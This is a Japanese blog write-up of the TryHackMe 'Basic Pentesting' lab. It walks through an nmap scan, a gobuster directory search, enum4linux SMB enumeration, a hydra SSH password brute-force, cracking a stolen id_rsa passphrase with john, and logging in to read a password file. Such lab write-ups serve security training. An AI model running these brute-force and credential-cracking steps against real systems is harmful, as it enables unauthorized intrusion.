---
title: "Thm Basic Pentesting Writeup"
date: 2021-03-28T12:50:28+09:00
description:
draft: false
hideToc: false
enableToc: true
enableTocContent: false
tocPosition: inner
tocLevels: ["h2", "h3", "h4"]
tags:
- ctf
- tryhackme
- basic-pentesting
- writeup
categories:
- WriteUP
series:
-
image: /posts/2021/03/img/basic-pentesting-thumbnail.png
---

## はじめに

今回はTryHackMeのBasic Pentestingを解いてみたので、そのWriteUPを書いていきたいと思います。

自分は約２時間程度で全ての問題を解き終わることが出来ましたので、時間の参考にしてみてください。

## WriteUP

### Find the services exposed by the machine

攻略するマシンのサービスの列挙です。
nmapを使ってポートスキャンをしていきます。

```$:Parrot.bash
nmap -v -p-10000 10.10.xxx.xxx
```

これでポートの列挙が出来ました。

{{< img src="/posts/2021/03/img/Screenshot_20210329_125935.png" >}}

### What is the name of the hidden directory on the web server(enter name without /)?

hidden derectoryを探す問題です。
gobusterを実行してあげます。

```$:Parrot.bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.xxx.xxx
```

無事hidden directoryを見つけることが出来ました。

{{< img src="/posts/2021/03/img/Screenshot_20210329_130518.png" >}}

### User brute-forcing to find the username & password

まずは、ポートスキャンで得た情報から、SMBが動いていることがわかります。
そのため、smbからUsernameを獲得しようと考え、今回はenum4linuxを使用しました。

{{< blogcard title="CiscoCXSecurity/enum4linux: enum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts." url="https://github.com/CiscoCXSecurity/enum4linux" >}}

```$:Parrot.bash
enum4linux -a 10.10.xxx.xxx
```

### What is the username?

enum4linuxからの情報で、２つのユーザーを見つけることが出来ました。

{{< img src="/posts/2021/03/img/Screenshot_20210329_132156.png" >}}

### What is the password?

nmapにてSSHのポートが開いていることが確認できたので、hydraを使ってパスワードのブルートフォースを試していきます。

```$:Parrot.bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.xxx.xxx ssh
```

### Enumerate the machine to find any vectors for privilege escalation

まずは先程獲得した他のユーザのディレクトリを確認し、特権昇格できそうな情報を探していきます。

{{< img src="/posts/2021/03/img/Screenshot_20210329_133606.png" >}}

最終的にpass.bakの中身を確認できればこのRoomは完了しそうだなぁというのを頭にいれつつ、.sshディレクトリの中身を見ていきます。

{{< img src="/posts/2021/03/img/Screenshot_20210329_134120.png" >}}

id_rsaが読み取り可能になっているので、そこから特権昇格を狙っていこうと思います。

### If you have found another user, what can you do with this information?

獲得したid_rsaでssh接続を試みてみます。

{{< img src="/posts/2021/03/img/Screenshot_20210329_134618.png" >}}

しかし、パスフレーズを求められてしまいました。

ここで、SSH2Johnを使って、SSH Key Passwordの解析を試みます。

```$:Parrot.bash
python2 /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
```

```$:Parrot.bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH id_rsa_hash.txt
```

無事パスワードがわかったので、ログインしていきます。

```$:Parrot.bash
ssh -i id_rsa kay@10.10.201.184
```

### What is the final password you obtain?

ログインが出来たので、最終的なフラグをゲットして終わりです。

```$:Remote.bash
cat pass.bak
```

### まとめ

今回はTryHackMeのBasic Pentestingを解いてみました。

これを解く前にLeaning PathのCOMPLETE BEGINNERを全て解いていたので、詰まりそうになったときはヒントを見たり、前の章をさらっと復習をすることをオススメします。
